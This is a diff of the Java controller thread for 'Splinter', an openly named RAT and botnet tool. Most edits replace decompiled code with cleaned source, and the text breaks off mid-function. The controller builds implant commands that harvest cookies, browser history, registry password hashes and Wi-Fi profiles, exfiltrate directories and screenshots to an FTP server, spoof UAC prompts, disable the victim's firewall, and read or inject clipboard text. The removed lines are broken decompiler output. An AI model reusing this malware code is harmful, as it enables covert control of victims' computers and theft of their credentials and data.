@@ -6,6 +6,8 @@
 	Splinter - The RAT (Remote Administrator Tool)
 	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
 	Copyright 2013 Solomon Sonya
+	
+	This copyright applies to the entire Splinter Project and all relating source code
 
 	This program is free software: you are free to  redistribute 
     it under the terms of the GNU General Public License as published by
@@ -45,6 +47,8 @@
 	Email	--> splinterbotnet@gmail.com
 	GitHub	--> https://github.com/splinterbotnet
 **/
+
+
 
 
 package Controller.Thread;
@@ -272,12 +276,12 @@ public class Thread_Terminal extends Thread
       Drivers.sop("Streams opened");
 
       this.myLocalControllerPort = this.sktMyConnection.getLocalAddress().toString();
-      this.myLocalController_IP = this.sktMyConnection.getLocalPort();
+      this.myLocalController_IP = ""+this.sktMyConnection.getLocalPort();
       this.myVictim_RHOST_IP = this.sktMyConnection.getInetAddress().toString();
       Drivers.sop(this.sktMyConnection.getInetAddress().toString());
       Drivers.sop(this.sktMyConnection.getLocalAddress().toString());
       Drivers.sop(this.sktMyConnection.getLocalSocketAddress().toString());
-      this.myRemote_RHOST_Port = this.sktMyConnection.getPort();
+      this.myRemote_RHOST_Port = ""+this.sktMyConnection.getPort();
 
       this.continueRun = true;
 
@@ -549,7 +553,7 @@ public class Thread_Terminal extends Thread
       {
         if (!determineCommand(this.inputLine))
         {
-          Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, this.myThread_ID, this.inputLine, Drivers.clrImplant, Drivers.clrBackground);
+          Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, this.inputLine, Drivers.clrImplant, Drivers.clrBackground);
         }
 
         this.processInterrupt = true;
@@ -606,13 +610,13 @@ public class Thread_Terminal extends Thread
             }
             else
             {
-              ((JPanel_TextDisplayPane)this.alJtxtpne_PrivatePanes.get(i)).appendString(true, this.myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
+              ((JPanel_TextDisplayPane)this.alJtxtpne_PrivatePanes.get(i)).appendString(true, ""+this.myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
             }
 
           }
           catch (Exception e)
           {
-            ((JPanel_TextDisplayPane)this.alJtxtpne_PrivatePanes.get(i)).appendString(true, this.myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
+            ((JPanel_TextDisplayPane)this.alJtxtpne_PrivatePanes.get(i)).appendString(true, ""+this.myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
           }
 
         }
@@ -620,7 +624,7 @@ public class Thread_Terminal extends Thread
       }
       else
       {
-        Drivers.txtpne_broadcastMessageBoard.appendString(true, this.myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
+        Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
       }
 
       return true;
@@ -769,7 +773,7 @@ public class Thread_Terminal extends Thread
 
         this.myRandomIdentifier = Driver.getUniqueRandomNumber();
 
-        sendCommand_RAW(this.myRandomIdentifier);
+        sendCommand_RAW(""+this.myRandomIdentifier);
 
         return true;
       }
@@ -799,7 +803,7 @@ public class Thread_Terminal extends Thread
           return true;
         }
 
-        Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, this.myThread_ID, this.inputLine, Drivers.clrImplant, Drivers.clrBackground);
+        Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, this.inputLine, Drivers.clrImplant, Drivers.clrBackground);
 
         return true;
       }
@@ -924,9 +928,9 @@ public class Thread_Terminal extends Thread
 
         this.myUniqueDelimiter = ("[SPLINTER_IMPLANT@" + this.myRandomIdentifier + "]");
 
-        sendCommand_RAW(this.myRandomIdentifier);
+        sendCommand_RAW(""+this.myRandomIdentifier);
 
-        this.myConfirmationID_Beacon = this.myRandomIdentifier;
+        this.myConfirmationID_Beacon = ""+this.myRandomIdentifier;
 
         if (Driver.instance_loaded_CONTROLLER)
         {
@@ -991,7 +995,7 @@ public class Thread_Terminal extends Thread
 
         this.myUniqueDelimiter = ("[SPLINTER_IMPLANT@" + this.myRandomIdentifier + "]");
 
-        sendCommand_RAW(this.myRandomIdentifier);
+        sendCommand_RAW(""+this.myRandomIdentifier);
 
         if ((this.i_am_setup_as_relay) && (this.relay_mode_PROXY))
         {
@@ -1125,7 +1129,7 @@ public class Thread_Terminal extends Thread
 
           this.myUniqueDelimiter = ("[SPLINTER_IMPLANT@" + this.myRandomIdentifier + "]");
 
-          sendCommand_RAW(this.myRandomIdentifier);
+          sendCommand_RAW(""+this.myRandomIdentifier);
           try
           {
             Drivers.appendRelayMessageCommandTerminal("NEW AGENT HAS JOINED THE RELAY: --->>> [ " + this.myUserName + " @ " + this.myVictim_RHOST_IP + " - " + this.myHostName + " ]");
@@ -1179,15 +1183,15 @@ public class Thread_Terminal extends Thread
           {
             if (arrCmd[4].startsWith("[SPLINTER_CONTROLLER]"))
             {
-              Drivers.txtpne_broadcastMessageBoard.appendString(true, this.myThread_ID, "NEW CONTROLLER HAS JOINED THE BRIDGE: ---->>> [ " + arrCmd[8] + " @ " + arrCmd[3] + " - " + arrCmd[5] + "] " + "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t", Drivers.clrController, Drivers.clrImplant.darker().darker());
+              Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "NEW CONTROLLER HAS JOINED THE BRIDGE: ---->>> [ " + arrCmd[8] + " @ " + arrCmd[3] + " - " + arrCmd[5] + "] " + "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t", Drivers.clrController, Drivers.clrImplant.darker().darker());
             }
             else
             {
-              Drivers.txtpne_broadcastMessageBoard.appendString(true, this.myThread_ID, "RELAYED COMMAND [ " + arrCmd[1] + " @ " + arrCmd[3] + "] --> " + arrCmd[4] + "\t\t\t\t\t\t\t\t\t", Drivers.clrController, Drivers.clrImplant.darker().darker());
+              Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "RELAYED COMMAND [ " + arrCmd[1] + " @ " + arrCmd[3] + "] --> " + arrCmd[4] + "\t\t\t\t\t\t\t\t\t", Drivers.clrController, Drivers.clrImplant.darker().darker());
             }
           }
           catch (Exception e) {
-            Drivers.txtpne_broadcastMessageBoard.appendString(true, this.myThread_ID, "RELAYED COMMAND RECEIVED: [" + line + "]" + "\t\t\t\t\t\t\t\t\t", Drivers.clrController, Drivers.clrImplant.darker().darker());
+            Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "RELAYED COMMAND RECEIVED: [" + line + "]" + "\t\t\t\t\t\t\t\t\t", Drivers.clrController, Drivers.clrImplant.darker().darker());
           }
 
           return true;
@@ -1277,7 +1281,7 @@ public class Thread_Terminal extends Thread
 
             try
             {
-              s = arrcmd[2];
+              String s = arrcmd[2];
             }
             catch (Exception e)
             {
@@ -1403,7 +1407,7 @@ public class Thread_Terminal extends Thread
             {
               if ((this.myFileBrowser != null) && (!this.frameFileBrowserIsDisposed))
               {
-                this.myFileBrowser.jtxtpne_ConsoleOut.appendString(true, this.myThread_ID, arrcmd[2], Drivers.clrImplant, Drivers.clrBackground);
+                this.myFileBrowser.jtxtpne_ConsoleOut.appendString(true, ""+this.myThread_ID, arrcmd[2], Drivers.clrImplant, Drivers.clrBackground);
               }
               else
               {
@@ -1470,34 +1474,35 @@ public class Thread_Terminal extends Thread
             this.objFileBrowser = new Object_FileBrowser(this.fle__isDrive, this.fle__fle, this.fle__driveDisplayName, this.fle__isFileSystem, this.fle__isFloppy, this.fle__isDirectory, this.fle__isFile, this.fle__isHidden, this.fle__isTraversable, this.fle__canRead, this.fle__canWrite, this.fle__canExecute, this.fle__fullPath, this.fle__parentDirectory, this.fle__dateLastModified_long, this.fle__totalSpace, this.fle__usableSpace, this.fle__Size, this.fle__upDirectory);
 
             this.myFileBrowser.alNewFileList.add(this.objFileBrowser);
-            try
-            {
-              if (!this.objFileBrowser.i_am_a_file)
-                break label5299;
-              this.myFileBrowser.jcbFileName.addItem(this.fle__fullPath);
-
-              String extension = "";
-              boolean found = false;
-              for (int i = 0; i < this.myFileBrowser.jcbCurrentDirectoryFilter.getItemCount(); i++)
-              {
-                extension = (String)this.myFileBrowser.jcbCurrentDirectoryFilter.getItemAt(i);
-
-                if ((extension != null) && ((extension.equalsIgnoreCase(this.objFileBrowser.myFileExtension_withoutPeriod)) || (this.objFileBrowser.myFileExtension_withoutPeriod.trim().equals("-"))))
-                {
-                  found = true;
-                  break;
-                }
-
-              }
-
-              if (found) {
-                break label5299;
-              }
-              this.myFileBrowser.jcbCurrentDirectoryFilter.addItem(this.objFileBrowser.myFileExtension_withoutPeriod);
-            }
-            catch (Exception localException16)
-            {
-            }
+            try	
+			{	
+				if(objFileBrowser.i_am_a_file)
+				{
+					myFileBrowser.jcbFileName.addItem(fle__fullPath);
+					
+					String extension = "";
+					boolean found = false;
+					for(int i = 0; i < myFileBrowser.jcbCurrentDirectoryFilter.getItemCount(); i++)
+					{
+						extension = (String)myFileBrowser.jcbCurrentDirectoryFilter.getItemAt(i);
+						
+						if(extension != null && (extension.equalsIgnoreCase(objFileBrowser.myFileExtension_withoutPeriod) || objFileBrowser.myFileExtension_withoutPeriod.trim().equals("-")))
+						{										
+							found = true;
+							break;
+						}
+						
+					}
+					
+					if(!found)
+					{
+						//add the new extension
+						myFileBrowser.jcbCurrentDirectoryFilter.addItem(objFileBrowser.myFileExtension_withoutPeriod);
+					}
+						
+					
+				}
+			}catch(Exception eee){}
 
           }
           else if (arrcmd[1].equals("END_FILE_LIST"))
@@ -1560,12 +1565,12 @@ public class Thread_Terminal extends Thread
           {
             if (arrcmd[2].equalsIgnoreCase(" *** --> NO TEXT IN CLIPBOARD AVAILABLE <-- ***"))
             {
-              Drivers.txtpne_broadcastMessageBoard.appendString(true, this.myThread_ID, "CONTROLLER MESSAGE: Note, I have detected an error from this agent interacting with host system's clipboard. Sending clipboard kill command now...", Drivers.clrBackground, Drivers.clrForeground);
+              Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "CONTROLLER MESSAGE: Note, I have detected an error from this agent interacting with host system's clipboard. Sending clipboard kill command now...", Drivers.clrBackground, Drivers.clrForeground);
               sendCommand_RAW("DISABLE CLIPBOARD EXTRACTOR");
             }
             else
             {
-              Drivers.txtpne_broadcastMessageBoard.appendString(true, this.myThread_ID, "CLIPBOARD: \"" + arrcmd[2] + "\"", Drivers.clrForeground, Drivers.clrBackground);
+              Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "CLIPBOARD: \"" + arrcmd[2] + "\"", Drivers.clrForeground, Drivers.clrBackground);
             }
 
           }
@@ -1612,7 +1617,7 @@ public class Thread_Terminal extends Thread
     try
     {
       String[] arrCmd = fullCmdLine.split("%%%%%");
-      String agentConfirmationID = this.myRandomIdentifier;
+      String agentConfirmationID = ""+this.myRandomIdentifier;
 
       if ((arrCmd == null) || (arrCmd.length < 2))
       {
@@ -1671,15 +1676,15 @@ public class Thread_Terminal extends Thread
 
       if (numCommandsSent < 1)
       {
-        Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, this.myThread_ID, "Agent checkin received from Agent ID: " + agentConfirmationID + ".  (0) commands sent to beacon implant...", Drivers.clrImplant, Drivers.clrBackground);
+        Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "Agent checkin received from Agent ID: " + agentConfirmationID + ".  (0) commands sent to beacon implant...", Drivers.clrImplant, Drivers.clrBackground);
       }
       else if (numCommandsSent == 1)
       {
-        Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, this.myThread_ID, "Agent checkin received from Agent ID: " + agentConfirmationID + " --> [" + numCommandsSent + "] command sent to beacon implant...", Drivers.clrImplant, Drivers.clrBackground);
+        Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "Agent checkin received from Agent ID: " + agentConfirmationID + " --> [" + numCommandsSent + "] command sent to beacon implant...", Drivers.clrImplant, Drivers.clrBackground);
       }
       else
       {
-        Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, this.myThread_ID, "Agent checkin received from Agent ID: " + agentConfirmationID + " --> [" + numCommandsSent + "] commands sent to beacon implant...", Drivers.clrImplant, Drivers.clrBackground);
+        Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+this.myThread_ID, "Agent checkin received from Agent ID: " + agentConfirmationID + " --> [" + numCommandsSent + "] commands sent to beacon implant...", Drivers.clrImplant, Drivers.clrBackground);
       }
 
       return true;
@@ -1844,7 +1849,7 @@ public class Thread_Terminal extends Thread
           Drivers.alTerminals.remove(this);
         }
 
-        updateBeaconConnectionTime(this.myRandomIdentifier);
+        updateBeaconConnectionTime(""+this.myRandomIdentifier);
 
         Drivers.jtblBeaconImplants.updateJTable = true;
 
@@ -2401,7 +2406,7 @@ public class Thread_Terminal extends Thread
   public String getChatScreenName() {
     if ((this.myChatScreenName == null) || (this.myChatScreenName.trim().equals("")))
     {
-      this.myChatScreenName = getId();
+      this.myChatScreenName = ""+getId();
     }
 
     return this.myChatScreenName;
@@ -2514,7 +2519,7 @@ public class Thread_Terminal extends Thread
       }
     }
 
-    this.vctMyRowData.add(getId());
+    this.vctMyRowData.add(""+getId());
     this.vctMyRowData.add(this.myFullGeoData);
     this.vctMyRowData.add(this.myImplantName);
     this.vctMyRowData.add(this.myCareOfAddress);
@@ -2548,318 +2553,428 @@ public class Thread_Terminal extends Thread
   }
 
   public boolean sendCommand_RAW(String cmdToSend)
-  {
-    try
-    {
-      try
-      {
-        try
-        {
-          Splinter_GUI.jpnlMainController.saveCommandHistory(cmdToSend);
-        }
-        catch (Exception localException1)
-        {
-        }
-        String[] arrInternalCmds;
-        int shortcutKey;
-        if ((cmdToSend != null) && (cmdToSend.trim().startsWith("<@SHORTCUT>/")))
-        {
-          arrInternalCmds = cmdToSend.split("/");
-
-          shortcutKey = Integer.parseInt(arrInternalCmds[1]);
-        }
-
-        switch (shortcutKey)
-        {
-        case 3:
-          int PORT = Integer.parseInt(arrInternalCmds[2]);
-
-          if ((PORT < 1) || (PORT > 65534))
-          {
-            throw new Exception("Port out of range!");
-          }
-
-          String listenerBinary_ImageName = arrInternalCmds[3];
-
-          if ((listenerBinary_ImageName == null) || (listenerBinary_ImageName.trim().equals("")))
-          {
-            throw new Exception("Binary File not specified");
-          }
-
-          cmdToSend = reformatShortcut_ESTABLISH_PERSISTEN_LISTENER(cmdToSend, PORT, listenerBinary_ImageName);
-
-          break;
-        case 4:
-          break;
-        default:
-          throw new Exception("Unknown Shortcut Key Specified"); break;
-
-          if ((cmdToSend != null) && (cmdToSend.trim().toLowerCase().startsWith("download")))
-          {
-            String[] arr = cmdToSend.split("\"");
-            if (arr.length != 2)
-            {
-              Driver.sop("download file is in invalid form.  enter download \"[absolute file path on remote machine]\"");
-            }
-            else if (!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
-            {
-              Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
-            }
-            else
-            {
-              cmdToSend = "[SPLINTER_IMPLANT]%%%%%SEND_FILE%%%%%" + FTP_ServerSocket.FTP_Server_Address + "%%%%%" + FTP_ServerSocket.PORT + "%%%%%" + arr[1];
-            }
-
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().toLowerCase().startsWith("capture screen")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%CAPTURE_SCREEN%%%%%" + this.myTempPath + "%%%%%" + FTP_ServerSocket.FTP_Server_Address + "%%%%%" + FTP_ServerSocket.PORT;
-          }
-          else if ((cmdToSend != null) && ((cmdToSend.trim().toLowerCase().startsWith("stop process")) || (cmdToSend.trim().equalsIgnoreCase("STOP_PROCESS"))))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%STOP_PROCESS";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.equalsIgnoreCase("ENUMERATE")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%ENUMERATE%%%%%" + this.myTempPath + "%%%%%" + FTP_ServerSocket.FTP_Server_Address + "%%%%%" + FTP_ServerSocket.PORT;
-          }
-          else if ((cmdToSend != null) && (cmdToSend.equalsIgnoreCase("HARVEST_WIRELESS_PROFILE")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%HARVEST_WIRELESS_PROFILE%%%%%" + this.myTempPath + "%%%%%" + FTP_ServerSocket.FTP_Server_Address + "%%%%%" + FTP_ServerSocket.PORT;
-          }
-          else if ((cmdToSend != null) && (cmdToSend.equalsIgnoreCase("HARVEST_COOKIES")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%HARVEST_COOKIES%%%%%" + this.myTempPath + "%%%%%" + FTP_ServerSocket.FTP_Server_Address + "%%%%%" + FTP_ServerSocket.PORT;
-          }
-          else if ((cmdToSend != null) && (cmdToSend.equalsIgnoreCase("HARVEST_BROWSER_HISTORY")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%HARVEST_BROWSER_HISTORY%%%%%" + this.myTempPath + "%%%%%" + FTP_ServerSocket.FTP_Server_Address + "%%%%%" + FTP_ServerSocket.PORT;
-          }
-          else if ((cmdToSend != null) && (cmdToSend.equalsIgnoreCase("HARVEST_REGISTRY_HASHES")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%HARVEST_REGISTRY_HASHES%%%%%" + this.myTempPath + "%%%%%" + FTP_ServerSocket.FTP_Server_Address + "%%%%%" + FTP_ServerSocket.PORT;
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().equalsIgnoreCase("RUNNING_PS")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%RUNNING_PS";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().toLowerCase().equalsIgnoreCase("ps")))
-          {
-            cmdToSend = "tasklist";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().toLowerCase().equalsIgnoreCase("pwd")))
-          {
-            cmdToSend = "echo %cd%";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().toLowerCase().equalsIgnoreCase("ls")))
-          {
-            cmdToSend = "dir";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().toLowerCase().startsWith("SPOOF_UAC".toLowerCase())))
-          {
-            String[] arr = cmdToSend.split(",");
-            if (arr.length != 3)
-            {
-              Driver.sop("spoof UAC is in invalid form. use [Spoofed Program Title], [Executable Name] next time.  e.g. SPOOF_UAC, Notepad, Notepad.exe. I am sending Default Windows Update instead");
-
-              cmdToSend = "[SPLINTER_IMPLANT]%%%%%SPOOF_UAC%%%%%null%%%%%null";
-            }
-            else
-            {
-              cmdToSend = "[SPLINTER_IMPLANT]%%%%%SPOOF_UAC%%%%%" + arr[1] + "%%%%%" + arr[2];
-            }
-
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().equalsIgnoreCase("INITIATE_FILE_BROWSER")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%INITIATE_FILE_BROWSER";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().equalsIgnoreCase("DISABLE_WINDOWS_FIREWALL")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%DISABLE_WINDOWS_FIREWALL";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().equalsIgnoreCase("ENABLE_WINDOWS_FIREWALL")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%ENABLE_WINDOWS_FIREWALL";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().equalsIgnoreCase("DISPLAY_WINDOWS_FIREWALL")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%DISPLAY_WINDOWS_FIREWALL";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().equalsIgnoreCase("EXTRACT_CLIPBOARD")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%EXTRACT_CLIPBOARD";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().equalsIgnoreCase("INJECT_CLIPBOARD")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%INJECT_CLIPBOARD%%%%% " + Drivers.jop_Query("Enter String to Inject into Clipboard: ", "Inject Into Clipboard");
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().toLowerCase().startsWith("ORBIT_DIRECTORY".toLowerCase())))
-          {
-            String[] arrOrbitEntries = cmdToSend.split(",");
-
-            if ((arrOrbitEntries == null) || (arrOrbitEntries.length != 5))
-            {
-              Drivers.jop("Invalid parameters for Orbiter Payload. Unable to Continue!");
-              return true;
-            }
-
-            if (!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
-            {
-              Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
-              return true;
-            }
-
-            int delay_secs = 1000;
-            try
-            {
-              delay_secs = 1000 * Integer.parseInt(arrOrbitEntries[4].trim());
-            }
-            catch (Exception ff) {
-              Drivers.jop("Invalid parameters for Orbiter Payload Delay interval. Unable to Continue!");
-              return true;
-            }
-
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%ORBIT_DIRECTORY%%%%%" + arrOrbitEntries[1] + "%%%%%" + arrOrbitEntries[2] + "%%%%%" + arrOrbitEntries[3] + "%%%%%" + delay_secs + "%%%%%" + FTP_ServerSocket.FTP_Server_Address + "%%%%%" + FTP_ServerSocket.PORT;
-          }
-          else if ((cmdToSend != null) && ((cmdToSend.trim().toLowerCase().startsWith("ALERTER_PAYLOAD".toLowerCase())) || (cmdToSend.trim().toLowerCase().startsWith("EXTRACTOR_PAYLOAD".toLowerCase())) || (cmdToSend.trim().toLowerCase().startsWith("INJECTOR_PAYLOAD".toLowerCase())) || (cmdToSend.trim().toLowerCase().startsWith("INSPECTOR_PAYLOAD".toLowerCase())) || (cmdToSend.trim().toLowerCase().startsWith("SELECTOR_PAYLOAD".toLowerCase()))))
-          {
-            String[] arrOrbitEntries = cmdToSend.split(",");
-
-            if ((arrOrbitEntries == null) || (arrOrbitEntries.length != 5))
-            {
-              Drivers.jop("Invalid parameters for Orbiter Payload. Unable to Continue!");
-              return true;
-            }
-
-            if (!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
-            {
-              Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
-              return true;
-            }
-
-            int delay_secs = 1000;
-            try
-            {
-              delay_secs = 1000 * Integer.parseInt(arrOrbitEntries[4].trim());
-            }
-            catch (Exception ff) {
-              Drivers.jop("Invalid parameters for Orbiter Payload Delay interval. Unable to Continue!");
-              return true;
-            }
-
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%ORBIT_DIRECTORY%%%%%" + arrOrbitEntries[1] + "%%%%%" + arrOrbitEntries[2] + "%%%%%" + arrOrbitEntries[3] + "%%%%%" + delay_secs + "%%%%%" + FTP_ServerSocket.FTP_Server_Address + "%%%%%" + FTP_ServerSocket.PORT;
-          }
-          else if ((cmdToSend != null) && ((cmdToSend.trim().toLowerCase().startsWith("halt orbiter payload")) || (cmdToSend.trim().toLowerCase().startsWith("stop orbit directory")) || (cmdToSend.trim().equalsIgnoreCase("STOP_ORBIT_DIRECTORY"))))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%STOP_ORBIT_DIRECTORY";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().toLowerCase().startsWith("SET_WALL_PAPER".toLowerCase())))
-          {
-            String path = cmdToSend.replace("SET_WALL_PAPER", "");
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%SET_WALL_PAPER%%%%% " + path.trim();
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().toLowerCase().startsWith("set wallpaper")))
-          {
-            String path = cmdToSend.replace("set wallpaper", "");
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%SET_WALL_PAPER%%%%% " + path.trim();
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().toLowerCase().startsWith("change wallpaper")))
-          {
-            String path = cmdToSend.replace("change wallpaper", "");
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%SET_WALL_PAPER%%%%% " + path.trim();
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().toLowerCase().startsWith("EXFIL_DIRECTORY".toLowerCase())))
-          {
-            String[] arrOrbitEntries = cmdToSend.split(",");
-
-            if ((arrOrbitEntries == null) || (arrOrbitEntries.length != 4))
-            {
-              Drivers.jop("Invalid parameters for Data Extraction Payload. Unable to Continue!");
-              return true;
-            }
-
-            if (!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
-            {
-              Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
-              return true;
-            }
-
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%EXFIL_DIRECTORY%%%%%" + arrOrbitEntries[1] + "%%%%%" + arrOrbitEntries[2] + "%%%%%" + arrOrbitEntries[3] + "%%%%%" + FTP_ServerSocket.FTP_Server_Address + "%%%%%" + FTP_ServerSocket.PORT;
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().equalsIgnoreCase("ENABLE CLIPBOARD EXTRACTOR")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%ENABLE CLIPBOARD EXTRACTOR";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().equalsIgnoreCase("ENABLE CLIPBOARD INJECTOR")))
-          {
-            String injectionText = Drivers.jop_Query("Please Supply Injection Text: ", "Enter Injection Text");
-
-            if (injectionText == null) {
-              return true;
-            }
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%ENABLE CLIPBOARD INJECTOR%%%%%" + injectionText + " ";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().equalsIgnoreCase("DISABLE CLIPBOARD INJECTOR")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%DISABLE CLIPBOARD INJECTOR";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().equalsIgnoreCase("DISABLE CLIPBOARD EXTRACTOR")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%DISABLE CLIPBOARD EXTRACTOR";
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().equalsIgnoreCase("SCRAPE SCREEN")))
-          {
-            if (!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
-            {
-              Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
-              return true;
-            }
-
-            configureEnvironmentForScreenScrape("SCREEN CAPTURE");
-
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%SCRAPE SCREEN%%%%%" + this.myTempPath + "%%%%%" + FTP_ServerSocket.FTP_Server_Address + "%%%%%" + FTP_ServerSocket.PORT;
-
-            if (this.worker_ScreenScrape != null)
-            {
-              try
-              {
-                this.worker_ScreenScrape.killThisThread = true;
-
-                if (this.worker_ScreenScrape.screenRecord != null)
-                {
-                  this.worker_ScreenScrape.screenRecord.dispose();
-                }
-              } catch (Exception e) { Driver.sop("Exception handled attempting to dispose previous screen renderer worker thread"); }
-
-            }
-            this.worker_ScreenScrape = new Worker_Thread_Payloads(200, null, 4, null, "", 1, this.fleMyScreenScrapeDirectory);
-            this.worker_ScreenScrape.myTerminal = this;
-          }
-          else if ((cmdToSend != null) && (cmdToSend.trim().equalsIgnoreCase("DISABLE RECORD SCREEN")))
-          {
-            cmdToSend = "[SPLINTER_IMPLANT]%%%%%DISABLE RECORD SCREEN";
-          }
-          break;
-        }
-      } catch (Exception e) {
-        Drivers.jop_Error("Invalid value entered from shortcut command. \n\nUnable to Continue  Code: " + e.getLocalizedMessage(), "Unable to Send Shortcut"); return false;
-      }
-
-      this.pwOut.println(cmdToSend);
-      this.pwOut.flush();
-      try {
-        Driver.logReceivedLine(false, getId(), " " + this.myRandomIdentifier + " ", " SPLINTER - CONTROLER ", " " + this.myImplantName + " ", " " + Thread_ServerSocket.ControllerIP + " ", " " + this.myVictim_RHOST_IP + " ", cmdToSend); } catch (Exception localException2) {
-      }
-      return true;
-    }
-    catch (Exception e)
-    {
-      Drivers.eop("Thread ID: " + this.myThread_ID + " sendCommand_RAW", this.strMyClassName, e, e.getLocalizedMessage(), false);
-    }
-
-    return false;
-  }
+	{
+		
+		
+		try
+		{
+			
+			
+			try//if below fails, simply fall through to send it out anyhow!
+			{
+				try
+				{
+					Splinter_GUI.jpnlMainController.saveCommandHistory(cmdToSend);
+				}catch(Exception f){}
+				
+				if(cmdToSend != null && cmdToSend.trim().startsWith(Driver.SHORTCUT_KEY_HEADER))
+				{
+					String [] arrInternalCmds = cmdToSend.split(Driver.INTERNAL_DELIMETER);
+					
+					int shortcutKey = Integer.parseInt(arrInternalCmds[1]);
+																				
+					switch(shortcutKey)
+					{
+						case Driver.SHORTCUT_VALUE_ESTABLISH_PERSISTENT_LISTENER:
+						{
+							int PORT = Integer.parseInt(arrInternalCmds[2]);
+							
+							if(PORT < 1 || PORT > 65534)
+							{
+								throw new Exception("Port out of range!");
+							}
+							
+							String listenerBinary_ImageName =  arrInternalCmds[3];
+							
+							if(listenerBinary_ImageName == null || listenerBinary_ImageName.trim().equals(""))
+							{
+								throw new Exception("Binary File not specified");
+							}
+							
+							cmdToSend = this.reformatShortcut_ESTABLISH_PERSISTEN_LISTENER(cmdToSend, PORT, listenerBinary_ImageName);
+							
+							break;
+						}
+						
+						case Driver.SHORTCUT_BROWSE_REMOTE_FILE_SYSTEM:
+						{
+							
+							break;
+						}
+						
+						default:
+						{
+							throw new Exception("Unknown Shortcut Key Specified");
+						}
+						
+					}
+					
+				}
+				
+				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith("download"))
+				{
+					String []arr = cmdToSend.split("\"");
+					if(arr.length != 2)
+					{
